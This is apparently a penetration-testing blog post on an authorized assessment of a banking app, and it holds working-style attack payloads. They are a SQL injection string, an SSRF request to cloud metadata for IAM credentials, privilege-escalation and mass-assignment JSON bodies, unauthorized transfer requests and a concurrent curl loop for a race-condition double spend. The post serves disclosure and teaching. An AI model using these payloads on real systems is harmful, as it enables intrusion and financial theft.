---
slug: i-hacked-a-bank
title: "I HACKED A BANK: 17 Critical Vulnerabilities — Part 1: The Big Hitters"
date: "2024-11-20"
description: "During an authorized security assessment of a banking application, I discovered 17 vulnerabilities including SQL injection, SSRF, privilege escalation, race conditions, and multiple IDOR flaws."
tags: ["Pentesting"]
series: "Bank Hack"
part: 1
---

**Executive summary:** During an authorized security assessment of a banking application, I discovered 17 vulnerabilities including SQL injection, SSRF, privilege escalation, race conditions, and multiple IDOR flaws. Together, these create complete attack chains capable of full system compromise.

> **Important Disclaimer:** This assessment was conducted ethically in a controlled lab environment with proper authorization. All vulnerabilities were reported to the appropriate parties. Never test systems without explicit authorization.

## Part 1: The Big Hitters

Let's start with the vulnerabilities that could immediately compromise the entire system.

### SQL Injection — Complete Database Dump
**Severity: CRITICAL — 9.8 CVSS**

The application's account lookup functionality accepted user input without proper sanitization, allowing direct SQL injection:

```
GET /api/accounts?id=1' OR '1'='1' --
# Response: All accounts in the database
```

With time-based blind injection techniques, I could extract the entire database schema, user credentials, and financial records.

### SSRF — Internal Service Access
**Severity: CRITICAL — 9.1 CVSS**

A URL preview feature allowed fetching arbitrary internal resources:

```
POST /api/preview
{"url": "http://169.254.169.254/latest/meta-data/iam/"}
# Response: AWS IAM credentials exposed
```

This SSRF vulnerability provided access to internal services, cloud metadata, and could be chained with other vulnerabilities for deeper access.

### Privilege Escalation — Admin Access
**Severity: CRITICAL — 9.8 CVSS**

The role assignment endpoint lacked proper authorization checks:

```
POST /api/users/self/role
{"role": "admin"}
# Response: {"status": "success", "role": "admin"}
```

Any authenticated user could elevate themselves to administrator, gaining access to all system functions including user management and financial controls.

### Unauthorized Payments — Financial Theft
**Severity: CRITICAL — 9.8 CVSS**

The payment endpoint accepted arbitrary source accounts without ownership verification:

```
POST /api/transfer
{
  "from_account": "VICTIM_ACCOUNT_ID",
  "to_account": "ATTACKER_ACCOUNT_ID", 
  "amount": 10000
}
# Response: {"status": "success"}
```

Combined with the SQL injection to enumerate accounts, this vulnerability enabled unauthorized transfers from any account in the system.

## Part 2: The Supporting Cast

These vulnerabilities might seem less severe individually, but they're the glue that makes attack chains possible.

### Mass Assignment — Object Manipulation
**Severity: HIGH — 8.6 CVSS**

The user update endpoint accepted any fields, allowing modification of protected attributes:

```
PUT /api/users/self
{
  "balance": 999999,
  "verified": true,
  "admin": true
}
```

### Race Condition — Infinite Money
**Severity: HIGH — 8.1 CVSS**

Concurrent transfer requests weren't properly serialized, allowing the same funds to be transferred multiple times:

```
# Send 100 concurrent requests transferring $1000
for i in {1..100}; do
  curl -X POST /api/transfer \
    -d '{"amount": 1000, "to": "attacker"}' &
done
# Result: $100,000 transferred from $1000 balance
```

### Unrestricted File Upload — Remote Code Execution
**Severity: HIGH — 8.8 CVSS**

The profile picture upload accepted any file type without validation. I could upload PHP shells for remote code execution, massive files for DoS, or executables for persistence.

## The Virtual Card Circus

### Arbitrary Card Creation
**Severity: HIGH — 7.1 CVSS**

The virtual card system created whatever card types I requested:

```
POST /api/virtual-card/create
{
  "card_type": "unlimited_black_card",
  "credit_limit": 9999999
}
```

### Card Freezing IDOR — Remote Account Locking
**Severity: HIGH — 7.7 CVSS**

Using card IDs from enumeration, I could freeze anyone's cards: instant denial-of-service.

### Card Limit Update IDOR
**Severity: HIGH — 8.1 CVSS**

Complete control over other people's financial limits — set to zero or millions, dealer's choice.

## The Complete Attack Chain

```
# Phase 1: Reconnaissance
1. SQL injection to dump all account numbers
2. Balance disclosure to identify high-value targets
3. API version downgrade to steal card PINs

# Phase 2: Establishment  
4. Unrestricted file upload for backdoor persistence
5. Privilege escalation to admin for full control

# Phase 3: Attack
6. Mass assignment to create unlimited funds
7. Unauthorized payments to transfer money
8. Card freezing for targeted denial-of-service
9. Race condition for infinite money glitch
```

| Severity | Count | Vulnerabilities |
|---|---|---|
| CRITICAL | 4 | SQL Injection, SSRF, Privilege Escalation, Unauthorized Payments |
| HIGH | 10 | Mass Assignment, Brute Force, Race Condition, Info Disclosure, File Upload, Card IDORs |
| MEDIUM | 3 | Balance Disclosure, Get Cards, Card Transactions IDOR |

## Final Thoughts: Why This Matters

This wasn't just about finding bugs — it was about understanding attack chains. Individual vulnerabilities are bad, but chained together they're catastrophic.

What scared me most wasn't any single vulnerability, but how they all worked together. **The lack of defense in depth meant that breaching one layer gave access to everything.**

For developers and security teams: Test holistically. Don't just look for individual bugs — look for how they can be combined. Because attackers definitely will.

> **Security Disclaimer:** This assessment was conducted ethically in a controlled lab environment. All vulnerabilities were reported to the appropriate parties. Never test systems without explicit authorization.
